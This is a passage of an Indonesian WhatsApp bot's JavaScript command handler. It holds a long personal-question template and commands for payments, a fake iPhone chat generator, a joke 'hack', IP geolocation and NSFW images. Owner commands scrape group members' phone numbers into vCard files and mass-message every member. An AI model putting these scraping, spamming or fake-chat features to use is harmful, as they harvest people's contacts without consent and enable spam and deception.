Surat tanah (Opsional) :͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏                           ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
Nama bapak : 
Nama Mama :
Anak ke : 
Stnk (Opsional) :
Tinggi badan :
Berat badan :
Golongan darah :
Riwayat penyakit :
Pernah disunat :
Pernah patah hati :
Nama mantan terakhir :
Pernah jadi anak motor :
Pernah ikut ekskul apa :
Nama guru favorit :
Makanan favorit :
Minuman favorit :
Pernah kabur dari rumah :
Suka pelihara hewan apa :
Pernah naik gunung mana aja :
Film favorit sepanjang masa :
Genre musik favorit :
Penyanyi favorit :
Pernah jadi ketua kelas :
Nama sahabat waktu SD :
Suka liburan ke mana :
Pernah mimpi aneh apa :
Nama karakter kartun favorit :
Pernah naksir guru? :
Ukuran sepatu :
Ukuran baju :
Tipe cowok/cewek idaman :
Cita-cita waktu kecil :
Pernah ranking berapa :
Paling benci pelajaran apa :
Hobi rahasia :
Nama game yang sering dimainin :
Pernah bolos sekolah? :
Bisa main alat musik apa :
Pernah viral di medsos? :
Akun IG (Opsional) :
Akun TikTok (Opsional) :
Suka pake parfum merk apa :
Nama tetangga yang paling ngeselin :
Pernah makan indomie mentah? :
Paling suka warna apa :
Pernah jadi anggota OSIS? :
Suka olahraga apa :
Pernah nyasar ke mana :
Hal paling memalukan dalam hidup :
Kalau jadi hewan, mau jadi apa :
Pernah tidur di kelas? :
Pernah kena razia HP? :
Bisa bahasa daerah apa aja :
Pernah pura-pura sakit? :
Suka nonton YouTube apa :
Kebiasaan sebelum tidur :
Kebiasaan bangun tidur :
Nama teman sebangku yang paling seru :
Sering curhat ke siapa :
Punya koleksi aneh apa :
Pernah jatuh di depan umum? :
Pernah ditilang? :
Pernah naksir sepupu? :
Sering dibilang mirip siapa :
Punya akun fake? :
Suka selfie atau candid :
Pernah baper sama temen sendiri? :
Suka mie kuah atau mie goreng :
Kalau kucing bisa ngomong, pengen nanya apa :
Hal paling romantis yang pernah dilakukan :
Pernah bikin surat cinta? :
Suka tidur siang? :
Kalau dikasih waktu libur seminggu, mau ke mana :
Pernah main truth or dare? :
Suka ngelamun tentang apa :
Pernah kirim salam di radio? :
Nama guru killer :
Pernah ngasih kado ke diri sendiri? :
Kalau jadi emoji, pengen jadi yang mana :
Pernah pura-pura sibuk biar nggak diajak nongki? :
Suka tidur sambil peluk guling atau boneka? :
Pernah disangka pacaran padahal temenan? :
Paling sering denger lagu siapa akhir-akhir ini :
Pernah ketemu orang asing yang langsung nyambung? :
Suka wangi parfum yang manis atau segar? :
Pernah ngerasa jadi karakter utama di hidup orang lain? :
Kalau punya podcast, bakal ngomongin apa :
Pernah lupa naro barang terus nemunya di tempat absurd? :
Pernah dapet hadiah random dari orang nggak dikenal? :
Suka nonton film di bioskop atau di rumah? :
Pernah main truth or dare dan nyesel? :
Paling males kalau diajak ke mana :
Pernah salah duduk di motor orang? :
Suka nyimpen chat lucu buat dibaca ulang? :
Kalau jadi warna, pengen jadi warna apa :
Pernah salah masuk grup WA? :
Pernah nyasar di mall? :
Suka nulis curhatan di notes HP? :
Pernah jadi korban typo memalukan? :
Kalau bisa ganti suara, pengen suara siapa :
Paling nggak bisa nolak kalau disodorin apa :
Pernah ketawa sampe nangis? :
Kalau bisa bikin film, tentang apa ceritanya :
Suka nostalgia ke zaman SD? :
Pernah kepikiran buka usaha random? :
Kalau jadi makanan, pengen jadi apa :
Pernah suka sama karakter di buku? :
Suka duduk di pojokan atau tengah? :
Pernah kaget sama notif padahal cuma update aplikasi? :
Kalau punya hewan peliharaan aneh, mau apa :
Pernah kesel sama alarm pagi? :
Suka nonton video satisfying? :
Paling suka hari apa dan kenapa :
Pernah dapet panggilan lucu dari temen? :
Kalau jadi alien, mau tinggal di planet mana :
Pernah kangen sama mantan musuh bebuyutan? :
Suka pake wallpaper HP gambar apa :
Pernah ngambil makanan orang karena ngira punya sendiri? :
Suka cium hujan atau aroma kopi? :
Pernah bilang “udah move on” padahal belum? :
Kalau bisa ngilang seharian, mau ngapain aja :
Pernah pura-pura ngerti padahal enggak? :
Suka nulis nama sendiri di kaca berembun? :
Kalau jadi suara GPS, mau pake gaya ngomong gimana :
Pernah nyoba hal baru dan gagal total? :
Suka pelajaran sejarah atau matematika? :
Kalau bisa jadi karakter anime, siapa yang dipilih :
Pernah dapet mimpi yang jadi kenyataan? :
Suka nyimpen tiket bioskop atau struk belanja? :
Kalau bikin tim superhero, namanya apa :
Pernah kepikiran tinggal di hutan? :
Suka nostalgia liat foto lama? :
Pernah disangka orang lain gara-gara gaya? :
Kalau bisa hidup di game, mau game apa :
Suka nonton sunrise atau sunset? :
Pernah nulis surat tapi gak dikirim? :
Kalau punya sahabat dari dunia lain, pengen bentuknya kayak apa :
Pernah dapet nasihat yang tiba-tiba ngena banget? :
Suka nyari quotes di Pinterest? :
Paling pengen nyoba kerjaan aneh apa :
Kalau bisa ngasih nama buat bintang, namanya apa :
Pernah duduk lama di toilet cuma buat scroll? :
Kalau hidup jadi komik, genrenya apa :
Pernah nyanyiin lagu cinta padahal jomblo?
Suka bangun pagi atau begadang? :
Kalau dikasih libur seminggu, pengen ngapain? :
Pernah naik sepeda sampe jatuh? :
Pernah disuruh jadi MC acara sekolah? :
Suka hujan atau panas? :
Kalau punya kekuatan super, pengen apa? :
Paling suka pelajaran apa di sekolah? :
Paling males kalau disuruh apa di rumah? :
Suka bantu mama masak nggak? :
Kalau ke warung, biasanya beli apa? :
Pernah salah ambil sandal di masjid? :
Suka sarapan pake apa? :
Pernah tidur sambil ngigau? :
Kalau disuruh pilih, mending nyapu atau ngepel? :
Pernah ikut lomba 17-an? Lomba apa? :
Suka banget sama makanan daerah apa? :
Kalau ke pasar, suka ngikut siapa? :
Paling sering dimarahin karena apa? :
Punya hobi unik? Ceritain dong :
Pernah dapet nilai 100? Pelajaran apa? :
Paling sering lupa bawa apa waktu sekolah? :
Suka main di luar rumah atau di dalam? :
Kalau lagi bete, ngapain biasanya? :
Suka gambar atau nulis? :
Pernah ikut upacara terus pingsan? :
Kalau disuruh milih, pengen tinggal di desa atau kota? :
Suka warna apa dan kenapa? :
Pernah dapet hadiah dari guru? :
Suka nonton kartun apa waktu kecil? :
Kalau jadi karakter game, pengen jadi siapa? :
Pernah makan nasi sama lauk aneh tapi enak? :
Kalau disuruh tampil di panggung, berani gak? :
Paling jago main game apa? :
Kalau punya alat waktu Doraemon, pengen yang mana? :
Pernah ngumpet pas ada tamu? :
Kalau disuruh jualan, pengen jual apa? :
Suka ikut bantuin bersihin rumah gak? :
Pernah naik truk, pick-up, atau becak? :
Paling susah bangun pagi hari apa? :
Kalau disuruh milih jadi penyiar radio atau host TV? :
Pernah bikin kue sendiri? Jadi atau gagal? :
Suka duduk deket siapa waktu sekolah? :
Pernah dapet tugas kelompok tapi kerja sendiri? :
Suka main alat musik? Bisa apa? :
Paling sering denger kata "eh kamu mirip..." siapa? :
Kalau jadi youtuber, mau bahas apa? :
Suka bawa bekal atau beli di kantin? :
Paling jago di pelajaran apa? :
Suka naik sepeda sore-sore? :
Kalau disuruh bikin lagu, temanya apa? :
Kalau jadi guru, pengen ngajar pelajaran apa? :
Suka duduk di mana pas naik angkot? :
Pernah salah masuk kelas? :
Pernah ikut karnaval 17-an? Jadi apa waktu itu? :
Kalau disuruh masak nasi, bisa nggak? :
Paling sering jadi apa di kelompok belajar? :
Pernah disuruh pidato di depan umum? :
Kalau main di luar, paling sering main apa? :
Pernah bawa tas berat banget ke sekolah? :
Kalau dikasih 1 jam bebas tugas, mau ngapain? :
Suka naik apa ke sekolah dulu? :
Pernah nangis gara-gara PR? :
Kalau di rumah mati lampu, biasanya ngapain? :
Paling suka jajanan SD apa? :
Pernah ngerjain tugas semalam suntuk? :
Kalau punya sepeda terbang, mau kemana dulu? :
Suka main layangan atau gasing? :
Pernah ikut pramuka? Suka atau terpaksa? :
Kalau disuruh jadi ketua kelas, siap gak? :
Paling sering diminta tolong apa di rumah? :
Pernah jadi peserta lomba masak di sekolah? :
Kalau dikasih pilihan bebas tugas rumah seminggu, milih gak? :
Paling sering lupa naro barang apa? :
Suka bantuin nyuci motor atau nontonin aja? :
Kalau jadi pohon, mau jadi pohon apa? :
Pernah ketiduran pas nonton TV? :
Suka main tebak-tebakan? Kasih satu dong :
Kalau punya robot, pengen bisa ngapain aja? :
Paling ribet milih baju atau milih lauk? :
Suka naik perosotan atau jungkat-jungkit? :
Paling sering diminta bantuin siapa di rumah? :
Kalau ada waktu sendiri, lebih suka tidur atau ngemil? :
Pernah dapet nilai merah? Reaksi kamu gimana? :
Kalau ada mesin waktu, pengen balik ke tahun berapa? :
Suka bantuin nyapu halaman atau pura-pura sibuk? :
Kalau jadi buah, pengen jadi buah apa? :
Paling suka acara TV apa pas kecil? :
Kalau dikasih pilihan liburan ke gunung atau pantai? :
Paling sering ngantuk di jam berapa? :
Kalau disuruh nyanyi, lagu andalanmu apa? :
Pernah pura-pura ngerti pelajaran padahal bingung? :
Suka main game petualangan atau balapan? :
Kalau bisa ngecat rumah sesuka hati, pengen warna apa? :
Pernah ke museum? Seru nggak? :
Kalau jadi karakter kartun, pengen jadi siapa? :
Pernah bantuin orang tua masak? Menu apa? :
Paling susah disuruh bangun pas hari apa? :
Kalau bikin klub rahasia, namanya apa? :
Paling sering ketawa gara-gara siapa? :
Kalau disuruh milih maskot keluarga, pengennya hewan apa? :
Kalau jadi penemu, pengen nemuin alat apa? :
Suka main di sawah atau di lapangan? :
Paling suka nyemil apa pas nonton TV? :
Pernah ngerasa rumah kayak labirin? :
Kalau bisa tidur di mana aja, pilih di mana? :
Pernah bikin kerajinan tangan dari kardus? :
Kalau dapet hadiah misterius, pengennya apa isinya? :
Paling suka mandi pagi atau sore? :
Kalau disuruh jadi penjaga hutan, berani nggak? :
Suka bantuin bersih-bersih kamar siapa? :
Kalau bisa belajar cepat satu hal, pengen bisa apa? :
Suka naik sepeda sendirian atau rame-rame? :
Paling sering ngaca di mana? :
Kalau jadi penulis, pengen nulis buku tentang apa? :
Suka dengerin suara alam? Favoritnya apa? :
Pernah bikin origami? Bisa bentuk apa aja? :
Kalau punya kebun sendiri, mau tanam apa? :
Paling sering tidur di ruangan mana di rumah? :
Suka ngumpul di ruang tamu atau dapur? :
Pernah ngitung semut waktu gabut? :
Kalau punya toko, pengen jual apa? :
Pernah bikin game sendiri (di kertas juga boleh)? :
Suka jalan kaki keliling kampung? :
Kalau punya alat sulap, pengen bisa ngapain? :
Paling sering ketawa gara-gara acara apa? :
Kalau punya nama planet sendiri, namanya apa? :
Suka bantuin jemur baju atau ngelipet baju? :
Kalau jadi benda, pengen jadi apa dan kenapa? :
Suka main air hujan atau diem di dalam rumah? :
Paling sering lupa naro sendal di mana? :
Kalau disuruh masak telur, pengen gaya apa? :
Pernah bantuin bikin tenda? :
Suka main ke rumah siapa waktu kecil? :
Kalau disuruh jaga warung, kuat berapa jam? :
Paling suka suara hujan, angin, atau jangkrik? :
Kalau punya hobi aneh, apa kira-kira? :
Suka liat langit malem atau pagi? :
Kalau bikin nama grup WA keluarga, namanya apa? :
Pernah main petak umpet sampe lupa waktu? :
Kalau punya lemari ajaib, isinya apa? :
Suka nonton acara lawak? Favoritmu siapa? :
Kalau bisa hidup di dunia film animasi, pilih yang mana? :
Pernah bantuin ngecat rumah? Seru nggak? :
Kalau bisa teleport, pengen ke mana dulu? :
Suka bantuin bikin hiasan buat acara keluarga? :
Paling sering dikira lagi mikir padahal... :
Kalau disuruh ngatur acara keluarga, ide apa yang seru? :
Pernah ngeliat pelangi dari tempat tinggi? :
Kalau punya suara unik, pengennya kayak apa? :
Suka main puzzle atau susun balok? :
Kalau punya saung pribadi, mau dihias kayak apa? :

\`SEMOGA BETAH YA☺️\` `)
}
break;

case "pay": 
case "payment":
case "allpayment": {
  const pay = `👋ʜᴀʟʟᴏ ᴋᴀᴋ *${info}*,ɪɴɢɪɴ ʙᴇʀᴛʀᴀɴꜱᴀᴋꜱɪ ᴅᴇɴɢᴀɴ ᴋᴀᴍɪ?😊 ᴜɴᴛᴜᴋ ᴍᴇʟᴀɴᴊᴜᴛᴋᴀɴ ᴛʀᴀɴꜱᴀᴋꜱɪ ꜱɪʟᴀʜᴋᴀɴ ᴋʟɪᴋ ᴅɪꜱɪɴɪ👇`;

  await oyin.sendMessage(m.chat, {
    interactiveMessage: {
      title: pay,
      nativeFlowMessage: {
        messageParamsJson: JSON.stringify({
          bottom_sheet: {
            in_thread_buttons_limit: 1,
            divider_indices: [1, 2, 3, 4, 5, 999],
            list_title: "｢ 𝗦𝗘𝗟𝗘𝗖𝗧 𝗣𝗔𝗬𝗠𝗘𝗡𝗧 ｣",
            button_title: "ʙᴜᴛᴛᴏɴ"
          }
        }),
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "QR", 
              url: "https://files.catbox.moe/vwh8cx.jpg"
            })
          },
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: "OVO", 
              id: "pay-ovo"
            })
          },
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: "DANA", 
              id: "pay-dana"
            })
          },
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: "GOPAY", 
              id: "pay-gopay"
            })
          }
        ]
      }
    }
  }, { quoted: m });
}
break;

case 'pay-dana': {
  await oyin.sendMessage(
    m.key.remoteJid,
    { 
      text: `  *｢PAYMENT｣*
*» Dana : ${dana}*
*#SERTAKAN BUKTI TF*`
    }
  )
  break;
}

case 'pay-ovo': {
  await oyin.sendMessage(
    m.key.remoteJid,
    { 
      text: `  *｢PAYMENT｣*
*» Ovo : ${ovo}*
*#SERTAKAN BUKTI TF*`
    }
  )
  break;
}

case 'pay-gopay': {
  await oyin.sendMessage(
    m.key.remoteJid,
    { 
      text: `  *｢PAYMENT｣*
*» Gopay : ${gopay}*
*#SERTAKAN BUKTI TF*`
    }
  )
  break;
}

case 'iqc': {
    if (!text) return m.reply(`*mana teks nya*\n*contoh: tes bang*`);

    await oyin.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

    try {
        await oyin.sendMessage(
            m.chat,
            {
                image: {
                    url: `https://brat.siputzx.my.id/iphone-quoted?time=12.00&batteryPercentage=90&carrierName=AXIS&messageText=${encodeURIComponent(text)}&emojiStyle=apple`
                },
                caption: '*✨ iphone fake chat berhasil bang*'
            },
            { quoted: m }
        );
    } catch (err) {
        console.error(err);
        await m.reply('*ya gagal bang🗿*');
    } finally {
        await oyin.sendMessage(m.chat, { react: { text: '🔴', key: m.key } });
    }
    break;
  }
case 'cek-mood': {
   let mood = [
      "Lapar",
      "Capek",
      "Bengong",
      "Semangat",
      "Sange 🗿",
      "Overthinking",
      "Happy",
      "Mager"
   ]
   m.reply(`😶‍🌫️ *Mood Kamu Hari Ini:* ${mood[Math.floor(Math.random()*mood.length)]}`)
}
break;

case 'cocok': {
   if (!q) return m.reply(`Contoh:\n.cocok XyZen & oline`)
   let persen = Math.floor(Math.random() * 100)
   m.reply(`🔮 *Hasil Kecocokan Nama*\n${q}\nCocoknya: ${persen}%`)
}
break;

case 'roasting': {
   let data = [
      "Lu tuh kayak update Windows… lama, berat, bikin emosi 🗿",
      "Skill lu? Kayaknya masih trial version 😭",
      "Lu kalau mikir, server bot aja lebih cepat.",
      "Lu tuh bukan jelek… cuma beda dari manusia lain 🤣",
      "Kadang gua mikir, lu ni NPC apa player sih?"
   ]
   m.reply(data[Math.floor(Math.random() * data.length)])
}
break;

case 'fakta-unik': {
   let data = [
      "Tahukah kamu? Tidur siang 20 menit bisa bikin otak segar.",
      "Semut bisa membawa beban 50x berat badannya.",
      "Bulan ga punya atmosfer, jadi ga ada suara di sana.",
      "Kentut lebih cepat dari lari manusia 😭."
   ]
   m.reply(`📘 *Fakta Unik:*\n${data[Math.floor(Math.random()*data.length)]}`)
}
break;

case 'hack': {
   if (!q) return m.reply("Tag atau tulis nomor target.\nContoh: .hack @user")
   m.reply(`🟢 Mengakses data target...\n0%`)
   setTimeout(() => m.reply(`25% - Mengambil password`), 1500)
   setTimeout(() => m.reply(`70% - Membobol foto gallery...`), 3000)
   setTimeout(() => m.reply(`99% - Selesai`), 4500)
   setTimeout(() => m.reply(`🤣 *canda Anjing!* Gua cuma bot, ya kali bisa gitu.`), 6000)
}
break;

case 'jodoh': {
   if (!q) return m.reply(`Contoh:\n.jodoh @nama`)
   let persen = Math.floor(Math.random() * 100)
   m.reply(`💞 *Kecocokan Jodoh*\nKamu cocok ${persen}% dengan ${q}`)
}
break;

case 'apakah': {
   if (!q) return m.reply(`Contoh:\n.apakah saya ganteng?`)
   let jawab = ["Iya", "Tidak", "Bisa Jadi", "Ga Mungkin", "Kayaknya iya", "Kayaknya tidak"]
   let hasil = jawab[Math.floor(Math.random() * jawab.length)]
   m.reply(`❓ *Pertanyaan:* ${q}\n💬 *Jawaban:* ${hasil}`)
}
break;

case 'track-ip': {
if (!text) return m.reply(`*Example:* ${prefix + command} 112.90.150.204`);
try {
let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());

const formatIPInfo = (info) => {
 return `
*IP Information*
• IP: ${info.ip || 'N/A'}
• Success: ${info.success || 'N/A'}
• Type: ${info.type || 'N/A'}
• Continent: ${info.continent || 'N/A'}
• Continent Code: ${info.continent_code || 'N/A'}
• Country: ${info.country || 'N/A'}
• Country Code: ${info.country_code || 'N/A'}
• Region: ${info.region || 'N/A'}
• Region Code: ${info.region_code || 'N/A'}
• City: ${info.city || 'N/A'}
• Latitude: ${info.latitude || 'N/A'}
• Longitude: ${info.longitude || 'N/A'}
• Is EU: ${info.is_eu ? 'Yes' : 'No'}
• Postal: ${info.postal || 'N/A'}
• Calling Code: ${info.calling_code || 'N/A'}
• Capital: ${info.capital || 'N/A'}
• Borders: ${info.borders || 'N/A'}
• Flag:
 - Image: ${info.flag?.img || 'N/A'}
 - Emoji: ${info.flag?.emoji || 'N/A'}
 - Emoji Unicode: ${info.flag?.emoji_unicode || 'N/A'}
• Connection:
 - ASN: ${info.connection?.asn || 'N/A'}
 - Organization: ${info.connection?.org || 'N/A'}
 - ISP: ${info.connection?.isp || 'N/A'}
 - Domain: ${info.connection?.domain || 'N/A'}
• Timezone:
 - ID: ${info.timezone?.id || 'N/A'}
 - Abbreviation: ${info.timezone?.abbr || 'N/A'}
 - Is DST: ${info.timezone?.is_dst ? 'Yes' : 'No'}
 - Offset: ${info.timezone?.offset || 'N/A'}
 - UTC: ${info.timezone?.utc || 'N/A'}
 - Current Time: ${info.timezone?.current_time || 'N/A'}
`;
};
 
if (!res.success) throw new Error(`IP ${text} not found!`);
await oyin.sendMessage(m.chat, { location: { degreesLatitude: res.latitude, degreesLongitude: res.longitude } }, { ephemeralExpiration: 604800 });
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
await delay(2000);
m.reply(formatIPInfo(res)); 
} catch (e) { 
m.reply(`Error: Unable to retrieve data for IP ${text}`);
}
}
break;

case 'waifu': {
  let waifuType = args[0]; 

  if (!waifuType) {
    const message = `Pilih jenis waifu yang diinginkan:`;
    return oyin.sendMessage(from, {
      text: `${message}`,
      buttons: [
        {
          buttonId: `.waifu sfw`,
          buttonText: { 
            displayText: 'SFW (Safe For Work) 🌸' 
          }
        }, 
        {
          buttonId: `.waifu nsfw`,
          buttonText: {
            displayText: "NSFW (Not Safe For Work) 🔥"
          }
        }
      ],
      viewOnce: true,
      headerType: 1 
    }, { quoted: catalems });
  }

  let waifuUrl;
  try {
    if (waifuType === 'nsfw') {
      const waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`);
      waifuUrl = waifudd.data.url;
    } else if (waifuType === 'sfw') {
      const waifudd = await axios.get(`https://waifu.pics/api/sfw/waifu`);
      waifuUrl = waifudd.data.url;
    } else {
      return oyin.sendMessage(from, { text: "Jenis waifu tidak valid. Harap gunakan 'sfw' atau 'nsfw'." }, { quoted: catalems });
    }

    const message = `Ahh Sayang 🥺🙏`;

    const buttons = [
      {
        buttonId: `.waifu ${waifuType}`,
        buttonText: { 
          displayText: 'Next Waifu' 
        }
      }
    ];

    await oyin.sendMessage(from, {
      image: { url: waifuUrl },
      caption: `${message}\n\n${footer}`,
      buttons: buttons,
      headerType: 4, 
      viewOnce: true
    }, { quoted: catalems });
  } catch (err) {
    console.error(err);
    return oyin.sendMessage(from, { text: 'Terjadi kesalahan saat mengambil gambar waifu.' }, { quoted: catalems });
  }
}
break;

case 'toimg': {
	oyin.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
	const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
        if (!m.quoted) return m.reply(`_Reply Sticker Dengan Pesan *.toimg*_`)
        let mime = m.quoted.mtype
if (mime =="imageMessage" || mime =="stickerMessage")
{
        let media = await oyin.downloadAndSaveMediaMessage(m.quoted)
        let name = await getRandom('.png')
        exec(`ffmpeg -i ${media} ${name}`, (err) => {
        	fs.unlinkSync(media)
            let buffer = fs.readFileSync(name)
            oyin.sendMessage(m.chat, { image: buffer }, { quoted: catalems })      
fs.unlinkSync(name)
        })
        
} else return m.reply(`Please reply to non animated sticker`)
    }
    break;
    
case 'setppbot': {
				if (!isCreator) return m.reply(mess.owner)
				if (!/image/.test(quoted.type)) return m.reply(`Reply Image Dengan Caption ${prefix + command}`)
				let media = await oyin.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
				if (text.length > 0) {
					let { img } = await generateProfilePicture(media)
					await oyin.query({
						tag: 'iq',
						attrs: {
							to: '@s.whatsapp.net',
							type: 'set',
							xmlns: 'w:profile:picture'
						},
						content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]
					})
					await oyin.unlinkSync(media)
					m.reply('Sukses')
				} else {
					await oyin.updateProfilePicture(botNumber, { url: media })
					await oyin.unlinkSync(media)
					m.reply('Sukses')
				}
			}
			break;
case 'delppbot': {
				if (!isCreator) return m.reply(mess.owner)
				await oyin.removeProfilePicture(oyin.user.id)
				m.reply('Sukses')
			}
			break;
			  
case 'donate': {
				m.reply('Donasi Dapat Melalui Url Dibawah Ini :\nhttps://saweria.co/XyZenSikma')
			}
			break;

case "savekontak1": {
if (!isCreator) return m.reply("khusus owner saya")
if (!text) return m.reply(example("idgrupnya\n\nketik *.listgc* untuk melihat semua list id grup"))
var idnya = text
var groupMetadataa
try {
groupMetadataa = await oyin.groupMetadata(`${idnya}`)
} catch (e) {
return reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`File Kontak Berhasil Dikirim ke Private Chat\n*Total ${halls.length} Kontak*`)
await oyin.sendMessage(m.sender, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: `File Kontak Berhasil Di Buat ✅\nTotal ${halls.length} Kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./database/contacts.vcf", "")
}}
break;

case "listgc": case "cekidgc": case "listgrup": {
    await oyin.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
    
    // 🔹 Ambil PP user (biar gak error)
    let ppuser;
    try {
        ppuser = await oyin.profilePictureUrl(m.sender, 'image')
    } catch {
        ppuser = 'https://telegra.ph/file/23f3f8a7d9d6cbbf7dfb7.jpg' // fallback kalo gak punya PP
    }

    let gcall = Object.values(await oyin.groupFetchAllParticipating().catch(_=> null))
    let listgc = '\n'
    await gcall.forEach((u, i) => {
        listgc += `*${i+1}.* ${u.subject}\n* *ID :* ${u.id}\n* *Total Member :* ${u.participants.length} Member\n* *Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n* *Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
    })

    oyin.sendMessage(m.chat, {
        text: `${listgc}`,
        contextInfo: {
            mentionedJid: [m.sender],
            externalAdReply: {
                thumbnail: await getBuffer(ppuser),
                title: `${gcall.length} Group Chat`,
                body: `© XyZen - 2025`,
                sourceUrl: global.linkSaluran,
                previewType: "PHOTO"
            }
        }
    }, {quoted: fkontak})
}
break;

case "pushkontak1": {
if (!isCreator) return m.reply("khusus owner saya")
if (!text) return m.reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
if (!text.split("|")) return m.reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var idnya = text.split("|")[0]
var delay = Number(text.split("|")[1])
var teks = text.split("|")[2]
if (!idnya.endsWith("@g.us")) return reply("Format ID Grup Tidak Valid")
if (isNaN(delay)) return reply("Format Delay Tidak Valid")
if (!teks) return reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var groupMetadataa
try {
groupMetadataa = await oyin.groupMetadata(`${idnya}`)
} catch (e) {
return reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
reply(`Memproses Mengirim Pesan Ke *${halls.length} Member Grup*`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
await oyin.sendMessage(mem, {text: teks}, {quoted: qtext})
await sleep(Number(delay))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
